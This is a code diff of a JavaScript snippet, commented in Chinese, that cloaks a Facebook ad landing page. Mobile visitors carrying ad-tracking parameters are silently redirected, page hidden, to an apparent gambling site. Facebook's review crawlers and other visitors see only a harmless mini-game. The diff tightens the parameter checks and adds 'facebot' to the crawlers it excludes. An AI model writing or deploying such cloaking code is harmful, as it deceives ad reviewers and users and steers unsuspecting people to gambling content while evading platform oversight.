@@ -1,54 +1,60 @@
 (function() {
-    // 【配置：跳转目标地址】 —— 已经帮你去掉了末尾空格
+    // 【配置：跳转目标地址】
     var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6".trim(); 
 
-    function isRealPlayer() {
+    function isRealClick() {
         var searchRaw = window.location.search.toLowerCase();
         var ua = navigator.userAgent.toLowerCase();
-
-        // 1. 占位符拦截
+        
+        // 1. 占位符死刑：只要有 {{ 或 %7b%7b 绝对不跳
         if (searchRaw.indexOf('%7b%7b') > -1 || searchRaw.indexOf('{{') > -1) return false;
 
-        // 2. 核心字段校验 (使用兼容性更好的 indexOf)
-        var requiredKeys = ['fbclid=', 'pixel=', 'apkch=', 'campaign=', 'adgroup=', 'creative='];
-        for (var i = 0; i < requiredKeys.length; i++) {
-            var key = requiredKeys[i];
-            var index = searchRaw.indexOf(key);
-            if (index === -1) return false;
-            
-            // 校验具体的值（防止空格绕过）
-            // 获取 "=" 之后的值，直到下一个 "&"
-            var valuePart = searchRaw.substring(index + key.length).split('&')[0];
-            if (decodeURIComponent(valuePart).trim().length <= 2) return false;
+        // 2. 核心字段校验：排除空格和无效值
+        var params = new URLSearchParams(window.location.search);
+        var required = ['fbclid', 'pixel', 'apkch', 'campaign', 'adgroup', 'creative'];
+        
+        for (var i = 0; i < required.length; i++) {
+            var val = params.get(required[i]);
+            // .trim() 剔除所有空格，确保参数内容不是空，且长度大于 2（防止单字母伪造）
+            if (!val || val.trim().length <= 2) return false;
         }
 
-        // 3. 环境过滤
+        // 3. 硬件环境校验：必须是移动端 (iOS/Android)
         if (!/iphone|ipad|ipod|android/.test(ua)) return false;
-        if (ua.indexOf('facebookexternalhit') > -1) return false;
+
+        // 4. 排除已知 FB 审核爬虫
+        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;
 
         return true; 
     }
 
-    // --- 执行逻辑 ---
-    if (isRealPlayer()) {
-        // 瞬间隐藏，准备跳转
-        document.documentElement.style.backgroundColor = '#ffffff';
-        document.documentElement.style.display = 'none';
+    // --- 执行 logic ---
+    if (isRealClick()) {
+        try {
+            var connector = config_target.indexOf('?') > -1 ? '&' : '?';
+            var finalUrl = config_target + connector + window.location.search.substring(1);
 
-        var connector = config_target.indexOf('?') > -1 ? '&' : '?';
-        var finalUrl = config_target + connector + window.location.search.substring(1);
-        
-        // 执行跳转
-        window.location.replace(finalUrl);
+            // 【防白屏核心逻辑】
+            // 先尝试跳转，3秒内没跳走会自动通过这个定时器让页面变回可见
+            var fallback = setTimeout(function() {
+                document.body.style.opacity = "1";
+                console.log("Jump failed or slow, stay in game.");
+            }, 3000);
 
-        // 【兜底补丁】如果 3 秒后还没跳走，尝试恢复显示（防止死白屏）
-        setTimeout(function() {
-            document.documentElement.style.display = 'block';
-        }, 3000);
+            // 判定成功后，瞬间让 body 透明（比 display:none 更稳定，不容易报错）
+            document.body.style.transition = "opacity 0.1s";
+            document.body.style.opacity = "0";
 
+            // 执行瞬间重定向
+            window.location.replace(finalUrl);
+
+        } catch (e) {
+            // 万一 JS 运行报错，立即显示游戏
+            document.body.style.opacity = "1";
+        }
     } else {
-        // 判定不跳：确保显示小游戏
-        document.documentElement.style.display = 'block';
+        // 不满足条件，直接加载游戏
+        console.log("Safe Mode: Loading Game Content.");
         if (typeof init === 'function') init();
     }
 })();
